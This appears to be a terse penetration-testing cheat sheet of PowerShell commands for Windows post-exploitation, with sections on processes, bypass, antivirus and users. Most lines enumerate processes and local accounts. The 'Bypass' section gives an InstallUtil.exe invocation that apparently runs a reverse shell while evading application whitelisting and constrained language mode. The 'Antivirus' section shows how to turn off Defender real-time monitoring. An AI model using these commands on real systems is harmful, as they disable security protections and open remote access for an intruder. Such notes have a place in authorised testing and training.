```
powershell get-item function:
Get-Process | Where-Object {$_.ProcessName –eq "explorer"}
Get-Process | ? {$_.ProcessName –eq “explorer”} | select Id,Handles
(Get-Process | ? {$_.ProcessName –eq “explorer”}).Id
```
### Bypass
$ExecutionContext.SessionState.LanguageMode
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /U c:\temp\psby.exe
### Antivirus
```
#Check status
Get-MpComputerStatus
#Disable
Set-MpPreference -DisableRealtimeMonitoring $true
```
### User
```
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
